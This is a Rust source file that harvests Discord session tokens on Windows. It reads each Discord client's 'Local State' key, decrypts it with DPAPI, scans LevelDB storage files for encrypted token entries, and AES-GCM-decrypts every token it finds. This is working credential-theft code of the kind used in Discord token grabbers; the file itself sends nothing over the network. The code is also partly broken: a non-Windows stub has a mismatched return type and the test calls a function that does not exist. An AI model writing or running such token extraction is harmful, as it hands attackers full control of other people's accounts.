use anyhow::{Context, Result};
use base64::{engine::general_purpose::STANDARD as BASE64, Engine};
use regex::Regex;
use std::fs;
use std::path::PathBuf;

// Windows-specific imports
#[cfg(target_os = "windows")]
use windows::Win32::Security::Cryptography::{CryptUnprotectData, CRYPT_INTEGER_BLOB};

/// Discord client type
#[derive(Debug)]
enum DiscordClient {
    Stable,
    Canary,
    Ptb,
}

impl DiscordClient {
    fn path(&self) -> &str {
        match self {
            DiscordClient::Stable => "discord",
            DiscordClient::Canary => "discordcanary",
            DiscordClient::Ptb => "discordptb",
        }
    }
}

/// Auto-detect and extract Discord tokens (returns all unique tokens found)
pub fn extract_tokens() -> Result<Vec<String>> {
    println!("Starting token extraction...");
    let mut tokens = std::collections::HashSet::new();
    let clients = vec![
        DiscordClient::Stable,
        DiscordClient::Canary,
        DiscordClient::Ptb,
    ];

    for client in clients {
        println!("Checking client: {:?}", client);
        if let Ok(client_tokens) = try_extract_from_client(&client) {
            println!("Found {} tokens in {:?}", client_tokens.len(), client);
            for token in client_tokens {
                tokens.insert(token);
            }
        } else {
             println!("Failed to extract from {:?}", client);
        }
    }
    
    println!("Total unique tokens found: {}", tokens.len());

    if tokens.is_empty() {
        anyhow::bail!("Could not find tokens in any Discord client")
    }

    Ok(tokens.into_iter().collect())
}

#[cfg(target_os = "windows")]
fn try_extract_from_client(client: &DiscordClient) -> Result<Vec<String>> {
    // Get APPDATA path
    let appdata = std::env::var("APPDATA").context("Could not get APPDATA environment variable")?;

    // Build Discord path
    let discord_path = PathBuf::from(appdata).join(client.path());

    // Read Local State file to get encryption key
    let local_state_path = discord_path.join("Local State");
    let local_state_content =
        fs::read_to_string(&local_state_path).context("Could not read Local State file")?;

    // Parse JSON to get encryption key
    let local_state: serde_json::Value =
        serde_json::from_str(&local_state_content).context("Could not parse Local State JSON")?;

    let encrypted_key = local_state["os_crypt"]["encrypted_key"]
        .as_str()
        .context("Could not find encrypted_key")?;

    // Base64 decode
    let encrypted_key_bytes = BASE64
        .decode(encrypted_key)
        .context("Could not decode encrypted_key")?;

    // Remove "DPAPI" prefix (first 5 bytes)
    let encrypted_key_bytes = &encrypted_key_bytes[5..];

    // Use Windows DPAPI to decrypt master key
    let master_key = decrypt_with_dpapi(encrypted_key_bytes)?;

    // Search for tokens in LevelDB
    let leveldb_path = discord_path.join("Local Storage").join("leveldb");

    if !leveldb_path.exists() {
        anyhow::bail!("LevelDB path does not exist");
    }

    let mut tokens = Vec::new();

    // Read all .ldb and .log files
    for entry in fs::read_dir(&leveldb_path)? {
        let entry = entry?;
        let path = entry.path();

        if let Some(ext) = path.extension() {
            if ext == "ldb" || ext == "log" {
                if let Ok(content) = fs::read(&path) {
                    // Search for all token patterns
                    let found_tokens = find_and_decrypt_tokens(&content, &master_key);
                    tokens.extend(found_tokens);
                }
            }
        }
    }
    
    Ok(tokens)
}

#[cfg(target_os = "windows")]
fn decrypt_with_dpapi(data: &[u8]) -> Result<Vec<u8>> {
    use std::ptr;

    unsafe {
        let mut input_blob = CRYPT_INTEGER_BLOB {
            cbData: data.len() as u32,
            pbData: data.as_ptr() as *mut u8,
        };

        let mut output_blob = CRYPT_INTEGER_BLOB {
            cbData: 0,
            pbData: ptr::null_mut(),
        };

        let result =
            CryptUnprotectData(&mut input_blob, None, None, None, None, 0, &mut output_blob);

        if result.is_err() {
            anyhow::bail!("DPAPI decryption failed");
        }

        // Copy decrypted data
        let decrypted =
            std::slice::from_raw_parts(output_blob.pbData, output_blob.cbData as usize).to_vec();

        Ok(decrypted)
    }
}

#[cfg(not(target_os = "windows"))]
fn try_extract_from_client(_client: &DiscordClient) -> Result<String> {
    anyhow::bail!("Token extraction is only supported on Windows")
}

#[cfg(not(target_os = "windows"))]
fn decrypt_with_dpapi(_data: &[u8]) -> Result<Vec<u8>> {
    anyhow::bail!("DPAPI decryption is only supported on Windows")
}

fn find_and_decrypt_tokens(data: &[u8], master_key: &[u8]) -> Vec<String> {
    let mut tokens = Vec::new();
    
    // Convert data to string for regex matching (lossy but simple)
    let content = String::from_utf8_lossy(data);

    // Use regex to find encrypted tokens
    // Pattern: dQw4w9WgXcQ:([Base64])
    let re = match Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)") {
        Ok(re) => re,
        Err(_) => return tokens,
    };

    for cap in re.captures_iter(&content) {
        if let Some(encrypted_token) = cap.get(1) {
            // Base64 decode
            if let Ok(encrypted_bytes) = BASE64.decode(encrypted_token.as_str()) {
                // Decrypt token
                if let Ok(token) = decrypt_token(&encrypted_bytes, master_key) {
                    tokens.push(token);
                }
            }
        }
    }

    tokens
}

fn decrypt_token(encrypted_data: &[u8], key: &[u8]) -> Result<String> {
    use aes_gcm::{
        aead::{Aead, KeyInit},
        Aes256Gcm, Nonce,
    };

    // AES-256-GCM decryption
    // First 3 bytes are version identifier "v10"
    if encrypted_data.len() < 15 {
        anyhow::bail!("Encrypted data is too short");
    }

    // Skip version identifier
    let encrypted_data = &encrypted_data[3..];

    // First 12 bytes are nonce/iv
    let nonce_bytes = &encrypted_data[..12];
    let ciphertext = &encrypted_data[12..];

    // Create cipher
    let cipher = Aes256Gcm::new_from_slice(key).map_err(|_| anyhow::anyhow!("Could not create AES cipher"))?;

    let nonce = Nonce::from_slice(nonce_bytes);

    // Decrypt
    let decrypted = cipher
        .decrypt(nonce, ciphertext)
        .map_err(|_| anyhow::anyhow!("AES decryption failed"))?;

    // Convert to string
    String::from_utf8(decrypted).context("Decrypted data is not valid UTF-8")
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    #[ignore] // Only run when Discord is installed
    fn test_extract_token() {
        let result = extract_token();
        match result {
            Ok(token) => println!("Extracted token: {}", token),
            Err(e) => println!("Error: {}", e),
        }
    }
}
